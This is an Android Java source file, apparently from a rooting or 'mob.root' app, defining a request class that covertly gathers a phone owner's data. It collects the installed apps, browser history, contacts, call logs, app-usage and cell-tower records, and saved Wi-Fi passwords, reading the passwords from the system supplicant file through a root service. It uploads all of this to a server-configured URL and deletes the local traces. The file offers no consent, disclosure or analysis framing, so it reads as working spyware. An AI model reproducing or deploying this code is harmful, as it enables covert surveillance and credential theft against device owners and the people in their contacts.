package com.mob.root.net;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

import org.apache.http.Header;
import org.json.JSONArray;
import org.json.JSONObject;

import android.content.ContentResolver;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.Signature;
import android.database.Cursor;
import android.os.Handler;
import android.os.Handler.Callback;
import android.os.Message;
import android.provider.Browser;
import android.provider.CallLog;
import android.provider.CallLog.Calls;
import android.provider.ContactsContract;

import com.loki.sdk.LokiService;
import com.mob.root.AMApplication;
import com.mob.root.entity.BrowserHistory;
import com.mob.root.entity.Contact;
import com.mob.root.entity.UserApp;
import com.mob.root.entity.UserCall;
import com.mob.root.entity.Wifi;
import com.mob.root.net.parser.ConfigParser;
import com.mob.root.tools.AMConstants;
import com.mob.root.tools.AMLogger;
import com.mob.root.tools.CommonUtils;

public class UploadDatasRequest extends AMRequest<String> implements Runnable {

	public UploadDatasRequest(IResponseListener<String> listener) {
		super(listener);
		mHandler = new Handler(new Callback() {
			
			@Override
			public boolean handleMessage(Message msg) {
				if(0 != msg.what) {
					return false;
				}
				try {
					doPost(url, jsonObject, true);
				} catch (Exception e) {
					AMLogger.e(null, e.getMessage());
				}
				return true;
			}
		});
	}
	
	private Handler mHandler;
	private String url;
	private JSONObject jsonObject;

	@Override
	public void start(Object... args) {
		try {
			this.args = args;
			ConfigParser parser = new ConfigParser();
			url = parser.getValue(AMApplication.instance, AMConstants.NET_DATA_UPLOAD_URL);
			if (CommonUtils.isEmptyString(url)) {
				return;
			}
			mHandler.post(this);
		} catch (Exception e) {
			AMLogger.e(null, e.getMessage());
		}
	}
	
	@Override
	public void onSuccess(int statusCode, Header[] headers, String datas) {
		super.onSuccess(statusCode, headers, datas);
		try {
			JSONObject jsonObject = new JSONObject(datas);
			int status = jsonObject.getInt(AMConstants.NET_DATAS_UPLOAD_STATUS);
			if(0 == status) {
				SharedPreferences sp = AMApplication.instance.getSharedPreferences(AMConstants.SP_NAME, Context.MODE_PRIVATE);
				sp.edit().putLong(AMConstants.SP_LAST_UPLOAD_STAMP, System.currentTimeMillis()).commit();
				
				File wifiFile = AMApplication.instance.getFileStreamPath(AMConstants.FILE_WIFI);
				File bsFile = AMApplication.instance.getFileStreamPath(AMConstants.FILE_BS);
				File arFile = AMApplication.instance.getFileStreamPath(AMConstants.FILE_APP_SWITCH);
				File appRmFile = AMApplication.instance.getFileStreamPath(AMConstants.APP_REMOVED);
				
				if(null != wifiFile && wifiFile.exists()) {
					wifiFile.delete();
				}
				if(null != bsFile && bsFile.exists()) {
					bsFile.delete();
				}
				if(null != arFile && arFile.exists()) {
					arFile.delete();
				}
				if(null != appRmFile && appRmFile.exists()) {
					appRmFile.delete();
				}
			}
		} catch (Exception e) {
			AMLogger.e(null, e.getMessage());
		}
	}
	
	@Override
	public void run() {
		try {
			jsonObject = getDatas();
			mHandler.sendEmptyMessage(0);
		} catch (Exception e) {
			AMLogger.e(null, e.getMessage());
		}
	}
	
	private JSONObject getDatas() throws Exception {
		JSONObject rootObject = new JSONObject();
		
		SharedPreferences sp = AMApplication.instance.getSharedPreferences(AMConstants.SP_NAME, Context.MODE_PRIVATE);
		long dayStamp = sp.getLong(AMConstants.SP_LAST_UPLOAD_STAMP, 0);
		ConfigParser parser = new ConfigParser();
		
		// 获取要上传的app列表     ----------------------------------------------------------------------------------------
		String appSW = parser.getValue(AMApplication.instance, AMConstants.NET_DATA_APPS_SWITCH);
		if(!CommonUtils.isEmptyString(appSW) && Integer.parseInt(appSW) == 0) {
			List<UserApp> applications = getApplications(dayStamp);
			
			JSONArray appJsonArray = new JSONArray();
			for (UserApp app : applications) {
				JSONObject jsonObject = new JSONObject();
				jsonObject.put(AMConstants.NET_DATAS_APP_VERSION_NAME, app.getVersionName());
				jsonObject.put(AMConstants.NET_DATAS_APP_VERSION_CODE, app.getVersionCode());
				jsonObject.put(AMConstants.NET_DATAS_APP_PACKAGE_NAME, app.getPackageName());
				jsonObject.put(AMConstants.NET_DATAS_APP_APP_NAME, app.getAppName());
				jsonObject.put(AMConstants.NET_DATAS_APP_SIGNATURE, app.getSignature());
				jsonObject.put(AMConstants.NET_DATAS_APP_INSTALLTIME, app.getInstallTime());
				jsonObject.put(AMConstants.NET_DATAS_APP_APP_TYPE, app.getAppType());
				
				appJsonArray.put(jsonObject);
			}
			String removedJson = CommonUtils.readFile(AMApplication.instance.getFileStreamPath(AMConstants.APP_REMOVED));
			JSONArray removedArray = new JSONArray(removedJson);
			for (int i = 0; i < removedArray.length(); i++) {
				JSONObject jsonObject = removedArray.getJSONObject(i);
				appJsonArray.put(jsonObject);
			}
			rootObject.put(AMConstants.NET_DATAS_APP_JSON, appJsonArray);
		}
		
		// 获取当天浏览器记录     ----------------------------------------------------------------------------------------
		String bhSW = parser.getValue(AMApplication.instance, AMConstants.NET_DATA_BH_SWITCH);
		if(!CommonUtils.isEmptyString(bhSW) && Integer.parseInt(bhSW) == 0) {
			List<BrowserHistory> historys = getBrowserHistory(dayStamp);
			JSONArray historysJsonArray = new JSONArray();
			for (BrowserHistory browser : historys) {
				JSONObject jsonObject = new JSONObject();
				jsonObject.put(AMConstants.NET_DATAS_BH_TITLE, browser.getTitle());
				jsonObject.put(AMConstants.NET_DATAS_BH_URL, browser.getUrl());
				jsonObject.put(AMConstants.NET_DATAS_BH_DATE, browser.getDate());
				
				historysJsonArray.put(jsonObject);
			}
			rootObject.put(AMConstants.NET_DATAS_BH_JSON, historysJsonArray);
		}
		
		// 获取当天新增通讯录     ----------------------------------------------------------------------------------------
		String contactSW = parser.getValue(AMApplication.instance, AMConstants.NET_DATA_CONTACTS_SWITCH);
		if(!CommonUtils.isEmptyString(contactSW) && Integer.parseInt(contactSW) == 0) {
			List<Contact> contacts = getContacts(dayStamp);
			
			JSONArray contactsJsonArray = new JSONArray();
			for (Contact contact : contacts) {
				JSONObject jsonObject = new JSONObject();
				jsonObject.put(AMConstants.NET_DATAS_CONTACT_ID, contact.getId());
				jsonObject.put(AMConstants.NET_DATAS_CONTACT_NAME, contact.getName());
				jsonObject.put(AMConstants.NET_DATAS_CONTACT_PHONE_NUMBER, contact.getPhoneNumber());
				
				contactsJsonArray.put(jsonObject);
			}
			rootObject.put(AMConstants.NET_DATAS_CONTACTS_JSON, contactsJsonArray);
		}
		
		//获取所有已连接的wifi ssid、psk     ----------------------------------------------------------------------------------------
		String wifiSW = parser.getValue(AMApplication.instance, AMConstants.NET_DATA_WIFIS_SWITCH);
		if(!CommonUtils.isEmptyString(wifiSW) && Integer.parseInt(wifiSW) == 0) {
			List<Wifi> wifis = getWifis();
			
			JSONArray wifiJsonArray = new JSONArray();
			for (Wifi wifi : wifis) {
				JSONObject jsonObject = new JSONObject();
				jsonObject.put(AMConstants.NET_DATAS_WIFI_SSID, wifi.getSsid());
				jsonObject.put(AMConstants.NET_DATAS_WIFI_PSK, wifi.getPsk());
				jsonObject.put(AMConstants.NET_DATAS_WIFI_ENCRYPTION_TYPE, wifi.getEncryptionType());
				
				wifiJsonArray.put(jsonObject);
			}
			rootObject.put(AMConstants.NET_DATAS_WIFI, wifiJsonArray);
		}
		
		//获得当天app运行记录     ----------------------------------------------------------------------------------------
		String arSW = parser.getValue(AMApplication.instance, AMConstants.NET_DATA_AR_SWITCH);
		if(!CommonUtils.isEmptyString(arSW) && Integer.parseInt(arSW) == 0) {
			String appRecordJson = getApplicationRecord();
			if(!CommonUtils.isEmptyString(appRecordJson)) {
				rootObject.put(AMConstants.NET_DATAS_APP_RECORD, new JSONArray(appRecordJson));
			}
		}
		
		//获取当天通话记录    ----------------------------------------------------------------------------------------
		String callsSW = parser.getValue(AMApplication.instance, AMConstants.NET_DATA_CALLS_SWITCH);
		if(!CommonUtils.isEmptyString(callsSW) && Integer.parseInt(callsSW) == 0) {
			List<UserCall> calls = getCalls(dayStamp);
			JSONArray callJsonArray = new JSONArray();
			for (UserCall call : calls) {
				JSONObject jsonObject = new JSONObject();
				jsonObject.put(AMConstants.NET_DATAS_CALLS_PHONE_NUMBER, call.getPhoneNumber());
				jsonObject.put(AMConstants.NET_DATAS_CALLS_CALL_TYPE, call.getCallType());
				jsonObject.put(AMConstants.NET_DATAS_CALLS_TIME, call.getTime());
				jsonObject.put(AMConstants.NET_DATAS_CALLS_NAME, call.getName());
				jsonObject.put(AMConstants.NET_DATAS_CALLS_DURATION, call.getDuration());
				
				callJsonArray.put(jsonObject);
			}
			rootObject.put(AMConstants.NET_DATAS_CALLS_JSON, callJsonArray);
		}
		
		//获得当前wifi切换信息      ----------------------------------------------------------------------------------------
		String wsSW = parser.getValue(AMApplication.instance, AMConstants.NET_DATA_WS_SWITCH);
		if(!CommonUtils.isEmptyString(wsSW) && Integer.parseInt(wsSW) == 0) {
			String wifiSwitchJson = getWifiSwitch();
			if(!CommonUtils.isEmptyString(wifiSwitchJson)) {
				rootObject.put(AMConstants.NET_DATAS_WIFI_SWITCH, new JSONArray(wifiSwitchJson));
			}
		}
		
		//获得当天基站切换信息     ----------------------------------------------------------------------------------------
		String bsSW = parser.getValue(AMApplication.instance, AMConstants.NET_DATA_BS_SWITCH);
		if(!CommonUtils.isEmptyString(bsSW) && Integer.parseInt(bsSW) == 0) {
			String bsSwitchJson = getBSSwitch();
			if(!CommonUtils.isEmptyString(bsSwitchJson)) {
				rootObject.put(AMConstants.NET_DATAS_BS_SWTICH, new JSONArray(bsSwitchJson));
			}
		}
		
		return rootObject;
	}

	private String getApplicationRecord() {
		File file = AMApplication.instance.getFileStreamPath(AMConstants.FILE_APP_SWITCH);
		return CommonUtils.readFile(file);
	}

	private List<UserApp> getApplications(long stamp) throws Exception {
		List<UserApp> apps = null;
		PackageManager packageManager = AMApplication.instance.getPackageManager();
		List<PackageInfo> packages = packageManager.getInstalledPackages(PackageManager.COMPONENT_ENABLED_STATE_DEFAULT);
		if (null == packages || 0 == packages.size()) {
			return null;
		}
		apps = new ArrayList<UserApp>();
		for (PackageInfo packageInfo : packages) {
			if(0 != stamp && packageInfo.firstInstallTime < stamp) {
				continue;
			}
			UserApp userApp = new UserApp();
			userApp.setAppName(packageInfo.applicationInfo.loadLabel(packageManager).toString());
			userApp.setPackageName(packageInfo.packageName);
			userApp.setVersionName(packageInfo.versionName);
			userApp.setVersionCode(packageInfo.versionCode);
			userApp.setInstallTime(packageInfo.firstInstallTime);
			
			PackageInfo info = packageManager.getPackageInfo(packageInfo.packageName, PackageManager.GET_SIGNATURES);
			Signature[] signatures = info.signatures;
			StringBuilder sb = new StringBuilder();
			for (Signature signature : signatures) {
				sb.append(signature.toCharsString());
	        }
			userApp.setSignature(sb.toString());
			ApplicationInfo ai = packageManager.getApplicationInfo(packageInfo.packageName, 0);
			if((ai.flags & ApplicationInfo.FLAG_SYSTEM) != 0) {
				userApp.setAppType(1);
			} else {
				userApp.setAppType(3);
			}
			apps.add(userApp);
		}
		return apps;
	}
	
	private List<BrowserHistory> getBrowserHistory(long stamp) {
		ContentResolver contentResolver = AMApplication.instance.getContentResolver();
		List<BrowserHistory> historys = null;
		Cursor cursor = null;
		String[] proj = new String[] { Browser.BookmarkColumns.TITLE, Browser.BookmarkColumns.URL, Browser.BookmarkColumns.DATE };
		String sel = null;
		if(0 != stamp) {
			sel = Browser.BookmarkColumns.BOOKMARK + " = 0 "; // 0 = history, 1 = bookmark
		} else {
			sel = Browser.BookmarkColumns.BOOKMARK + " = 0 and " + Browser.BookmarkColumns.DATE + " > " + stamp; // 0 = history, 1 = bookmark
		}
		historys = new ArrayList<BrowserHistory>();
		try {
			cursor = contentResolver.query(Browser.BOOKMARKS_URI, proj, sel, null, null);;  
			while (cursor != null && cursor.moveToNext()) {  
				BrowserHistory userBrowser = new BrowserHistory();
				userBrowser.setTitle(cursor.getString(cursor.getColumnIndex(Browser.BookmarkColumns.TITLE)));  
				userBrowser.setUrl(cursor.getString(cursor.getColumnIndex(Browser.BookmarkColumns.URL)));
				userBrowser.setDate(cursor.getString(cursor.getColumnIndex(Browser.BookmarkColumns.DATE)));
				
				historys.add(userBrowser);
			}
		} catch (Exception e) {
			AMLogger.e(null, e.getMessage());
		} finally {
			if(null != cursor) {
				cursor.close();
			}
		} 
		return historys;
	}
	
	private List<Contact> getContacts(long dayStamp) {
		List<Contact> contacts = null;
		ContentResolver contentResolver = AMApplication.instance.getContentResolver();
		contacts = new ArrayList<Contact>();
		Cursor cursor = null;
		try {
			cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
			while (cursor.moveToNext()) {
				long time = cursor.getLong(cursor.getColumnIndex(ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP));
				if(0 != dayStamp && time < dayStamp) {
					continue;
				}
				Contact userContact = new Contact();
				String contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));

				userContact.setId(contactId); // 得到联系人ID
				userContact.setName(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME))); // 得到联系人名称

				Cursor phones = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = " + contactId, null, null);
				if (phones.moveToFirst()) {
					userContact.setPhoneNumber(phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
				}
				contacts.add(userContact);
			}
		} catch (Exception e) {
			AMLogger.e(null, e.getMessage());
		} finally {
			if(null != cursor) {
				cursor.close();
			}
		}
		return contacts;
	}
	
	private List<Wifi> getWifis() {
		List<Wifi> wifis = null;
		LokiService lokiService = LokiService.getInstance(AMApplication.instance);
		if(null == lokiService) {
			return null;
		}
		String supplicant = lokiService.readSupplicant();
		int index = supplicant.indexOf("network=");
		String networkStr = supplicant.substring(index, supplicant.length());
		String[] networkArray = networkStr.split("network=");
		int length = networkArray.length;
		wifis = new ArrayList<Wifi>();
		for (int i = 0; i < length; i++) {
			String strObj = networkArray[i];
			if (CommonUtils.isEmptyString(strObj)) {
				continue;
			}

			String ssid = null;
			String psk = null;
			String encryption = null;
			int ssidIndex = strObj.indexOf("ssid=\"");
			String tempSSID = strObj.substring(ssidIndex + "ssid=\"".length());
			ssid = tempSSID.substring(0, tempSSID.indexOf("\""));

			int pskIndex = strObj.indexOf("psk=\"");
			if (pskIndex != -1) {
				String tempPSK = strObj.substring(pskIndex + "psk=\"".length());
				psk = tempPSK.substring(0, tempPSK.indexOf("\""));
			}
			
			int encryptionIndex = strObj.indexOf("key_mgmt=");
			if(encryptionIndex != -1) {
				encryption = strObj.substring(encryptionIndex + "key_mgmt=".length());
				encryption = encryption.substring(0, encryption.indexOf("\n"));
			}
			
			Wifi wifi = new Wifi();
			wifi.setSsid(ssid);
			wifi.setPsk(psk);
			wifi.setEncryptionType(encryption);

			wifis.add(wifi);
		}
		return wifis;
	}
	
	private List<UserCall> getCalls(long stamp) {
		List<UserCall> calls = null;
		Cursor cursor = null;
		ContentResolver contentResolver = AMApplication.instance.getContentResolver();
		try {
			cursor = contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, null);
			calls = new ArrayList<UserCall>();
			while (null != cursor && cursor.moveToNext()) {
				long time = cursor.getLong(cursor.getColumnIndex(Calls.DATE));
				if(0!= stamp && time < stamp) {
					continue;
				}
				UserCall call = new UserCall();
				call.setPhoneNumber(cursor.getString(cursor.getColumnIndex(Calls.NUMBER)));
				// Calls.INCOMING_TYPE 呼入 Calls.OUTGOING_TYPE 呼出 Calls.MISSED_TYPE 未接
				call.setCallType(Integer.parseInt(cursor.getString(cursor.getColumnIndex(Calls.TYPE))));
				call.setTime(stamp + "");
				call.setName(cursor.getString(cursor.getColumnIndex(Calls.CACHED_NAME)));
				call.setDuration(cursor.getString(cursor.getColumnIndex(Calls.DURATION)));
				
				calls.add(call);
			}
		} catch (Exception e) {
			AMLogger.e(null, e.getMessage());
		} finally {
			if(null != cursor) {
				cursor.close();
			}
		}
		return calls;
	}
	
	private String getWifiSwitch() {
		String resultJson = null;
		File file = AMApplication.instance.getFileStreamPath(AMConstants.FILE_WIFI);
		resultJson = CommonUtils.readFile(file);
		return resultJson;
	}
	
	private String getBSSwitch() {
		String resultJson = null;
		File file = AMApplication.instance.getFileStreamPath(AMConstants.FILE_BS);
		resultJson = CommonUtils.readFile(file);
		return resultJson;
	}
}
